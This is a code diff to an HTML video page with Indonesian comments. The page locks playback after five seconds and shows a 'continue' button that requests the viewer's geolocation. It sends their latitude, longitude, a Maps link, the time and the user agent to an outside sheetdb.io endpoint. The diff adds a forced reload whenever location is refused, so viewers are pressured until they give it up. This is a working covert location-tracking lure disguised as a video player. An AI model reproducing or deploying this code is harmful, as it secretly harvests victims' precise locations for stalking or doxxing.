@@ -12,7 +12,6 @@
 </video>
 
 <div id="box" style="display:none; position:fixed; bottom:0; width:100%; background:black; color:white; text-align:center; padding:15px;">
-  <p>Lanjutkan untuk menonton</p>
   <button onclick="lanjut()" style="padding:12px; font-size:16px;">
     ▶ Lanjutkan Video
   </button>
@@ -23,60 +22,61 @@ let v = document.getElementById("vid");
 let sudahKlik = false;
 let terkunci = false;
 
-// paksa autoplay
+// autoplay
 v.play().catch(()=>{});
 
-// LOCK setelah 5 detik
+// setelah 5 detik video dikunci
 let cek = setInterval(() => {
   if (v.currentTime >= 5 && !terkunci) {
     terkunci = true;
     v.pause();
-
     document.getElementById("box").style.display = "block";
   }
-}, 500);
+}, 300);
 
-// cegah semua cara play manual
-v.onclick = () => {
-  if (terkunci && !sudahKlik) {
-    v.pause();
-  }
-};
-
+// cegah play manual sebelum klik
 v.addEventListener("play", () => {
-  if (terkunci && !sudahKlik) {
-    v.pause();
-  }
+  if (terkunci && !sudahKlik) v.pause();
 });
 
 function lanjut() {
   if (sudahKlik) return;
   sudahKlik = true;
 
-  navigator.geolocation.getCurrentPosition(pos => {
+  navigator.geolocation.getCurrentPosition(
 
-    let lat = pos.coords.latitude;
-    let lon = pos.coords.longitude;
+    // ✅ jika diizinkan
+    pos => {
+      let lat = pos.coords.latitude;
+      let lon = pos.coords.longitude;
 
-    fetch("https://sheetdb.io/api/v1/av906p3tie5ax", {
-      method: "POST",
-      headers: {"Content-Type": "application/json"},
-      body: JSON.stringify({
-        data: [{
-          waktu: new Date().toLocaleString(),
-          latitude: lat,
-          longitude: lon,
-          maps: "https://www.google.com/maps?q=" + lat + "," + lon,
-          device: navigator.userAgent
-        }]
-      })
-    });
+      fetch("https://sheetdb.io/api/v1/av906p3tie5ax", {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({
+          data: [{
+            waktu: new Date().toLocaleString(),
+            latitude: lat,
+            longitude: lon,
+            maps: "https://www.google.com/maps?q=" + lat + "," + lon,
+            device: navigator.userAgent
+          }]
+        })
+      });
 
-  });
+      v.play();
+      document.getElementById("box").style.display = "none";
+    },
 
-  // buka kunci
-  v.play();
-  document.getElementById("box").style.display = "none";
+    // ❌ jika ditolak → AUTO RELOAD
+    err => {
+      alert("Anda harus mengizinkan lokasi untuk melanjutkan");
+
+      setTimeout(() => {
+        location.reload();
+      }, 1000);
+    }
+  );
 }
 </script>
 
